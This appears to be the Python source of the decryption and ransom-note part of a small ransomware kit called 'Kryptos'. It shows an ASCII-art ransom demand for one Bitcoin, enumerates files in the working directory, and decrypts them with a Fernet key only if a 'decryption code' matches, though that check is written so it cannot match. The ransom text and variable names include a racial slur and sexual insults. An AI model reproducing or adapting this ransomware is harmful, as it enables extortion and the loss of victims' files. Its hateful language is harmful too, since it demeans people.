import os
from aiohttp import content_disposition_filename
from certifi import contents
from cryptography.fernet import Fernet
from pystyle import *
import time
from colorama import *

os.system('cls')
time.sleep(1)
os.system(f'cls & mode 85,20 & title Kryptos | exte was here')
Write.Print("""
                     :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~  Choke on this dick bitch.\nAll of your files have been ENCRYPTED..\nSend 1 Bitcoin to this adress to unlock them ══► (your crypto wallet)""", Colors.red, interval=0.001)


files = []

for file in os.listdir():
        if file == "choking.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        if os.path.isfile(file):
                files.append(file)

print(files)


with open("thekey.key", "rb") as key:
        secretkey = key.read()

tosniggersex = ["i use dm de goo. ."],["i like sucking dicks im gay asf!"],["cheese crakeeeeez"],["zaaaaaaaaaaaaaaaaaeeeeeeeeeeeeeeellllllllllllllllllllll pro hgaxor 1357 #1337!."],["tos_nigger cheeks"],[".Kxrma Owns M3 v430998982769286geigj"],["UIHgyrg9873oyghuiiuhzrhg95yg3g3"],["prosecuritykey.cum8489627692876298"]

tos_sex = Write.Input("╔══Enter the decryption code.\n╚══► ", Colors.red, interval=1)

if tos_sex == tosniggersex:
    for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                   thefile.write(contents_decrypted)
            Write.Input("Congrats, you're files are now decrypted. Enjoy them and don't fall anymore for malicious files bbby <3.", Colors.green, interval=1)
else:
        Write.Input("Wrong key, send me more btc. ~~> (your crypto wallet)", Colors.purple, interval=0.1)
